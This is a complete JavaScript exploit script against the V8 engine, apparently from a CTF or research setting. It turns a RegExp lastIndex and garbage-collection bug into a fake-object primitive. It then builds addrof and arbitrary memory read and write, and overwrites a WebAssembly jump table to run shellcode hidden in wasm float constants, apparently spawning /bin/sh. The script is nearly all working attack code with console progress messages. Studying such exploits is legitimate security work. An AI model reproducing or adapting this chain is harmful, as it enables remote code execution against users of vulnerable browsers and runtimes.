// ====================
// | Helper Functions |
// ====================
roots = new Array(0x20000);
index = 0;

function major_gc() {
    new ArrayBuffer(0x40000000);
}

function minor_gc() {
    for (var i = 0; i < 8; i++) {
        roots[index++] = new ArrayBuffer(0x200000);
    }
    roots[index++] = new ArrayBuffer(8);
}

function hex(i) {
    return "0x" + i.toString(16)
}

buf = new ArrayBuffer(8);
float_view = new Float64Array(buf);
u64_view = new BigUint64Array(buf);

function itof(i) {
    u64_view[0] = i;
    return float_view[0];
}

function ftoi(f) {
    float_view[0] = f;
    return u64_view[0];
}

function lo(x) {
    return BigInt(x) & BigInt(0xffffffff);
}

function hi(x) {
    return (BigInt(x) >> 32n) & BigInt(0xffffffff);
}

// ===========
// | Exploit |
// ===========
var re = new RegExp("leet", "g");
var exec_bak = RegExp.prototype.exec;  // backup original exec()
RegExp.prototype.exec = function () { return null; };
var n = 1073741824;
re.exec = function () {
    new Array(0x0d);
    re.lastIndex = n;
    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
    return [""];  // to get into `SetAdvancedStringIndex`
}
major_gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
re[Symbol.replace]("", "l33t");
console.assert(re.lastIndex === n + 1);  // 1073741825 == 1073741824+1
RegExp.prototype.exec = exec_bak;  // restore original exec()

minor_gc();
major_gc();

var fakeobj = re.lastIndex;

// 3.6943954791292419e-311 = 0x000006cd0018ece1
// 0x0018ece1 is address of PACKED_DOUBLE_ELEMENTS map
// 0x000006cd is address of PACKED_DOUBLE_ELEMENTS property

// 0x00282301 is address of our fake double array element (could be any value, adjust to your needs)
// 0x00100000 is the length of our fake double array
// 2.2250738598067922e-308 = 0x0010000000282301

var spray = [
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
    3.6943954791292419e-311, 2.2250738598067922e-308,
];

var fakelen = 0x00100000n;
console.assert(BigInt(fakeobj.length) === fakelen >> 1n);
console.log(`[*] fakeobj double array with length = ${hex(fakeobj.length)}`);

var idx = 13;

var addrof_arr = [spray, 0];
eval("%DebugPrint(addrof_arr)")
let addrof_arr_el = 0x282299n;

function addrof(o) {
    spray[idx] = itof(addrof_arr_el | (fakelen << 32n));
    addrof_arr[0] = o;
    return lo(ftoi(fakeobj[0]));
}

function cread32(addr) {
    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
    spray[idx] = itof(el_addr | fakelen << 32n);
    return lo(ftoi(fakeobj[0]));
}

function cread64(addr) {
    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
    spray[idx] = itof(el_addr | fakelen << 32n);
    return ftoi(fakeobj[0]);
}

function cwrite32(addr, data) {
    let temp = cread32(addr+4n);
    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
    spray[idx] = itof(el_addr | fakelen << 32n);
    fakeobj[0] = itof(data | temp << 32n)
}

function cwrite64(addr, data) {
    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
    spray[idx] = itof(el_addr | fakelen << 32n);
    fakeobj[0] = itof(data)
}

/*
(module
  (func (export "main") (result f64)
    f64.const 1.617548436999262e-270
    f64.const 1.6181477269733566e-270
    f64.const 1.6305238557700824e-270
    f64.const 1.6477681441619941e-270
    f64.const 1.6456891197542608e-270
    f64.const 1.6304734321072042e-270
    f64.const 1.6305242777505848e-270
    drop
    drop
    drop
    drop
    drop
    drop
  )
  (func (export "pwn"))
)
*/
var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
for (let j = 0x0; j < 20000; j++) {
    wmain();
}

instance_addr = addrof(instance);
jump_table_start = instance_addr + 0x48n;
rwx_addr = cread64(jump_table_start);
sc_addr = rwx_addr + 0x81an - 0x5n;
console.log("[+] Shellcode @", hex(sc_addr+0x5n));

console.log("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode");
cwrite32(jump_table_start, sc_addr & BigInt(2**32-1));

// to trigger jmp to address pointed by jump_table_start, we need another new function
var pwn = instance.exports.pwn;
console.log("[+] Executing shellcode");
pwn();
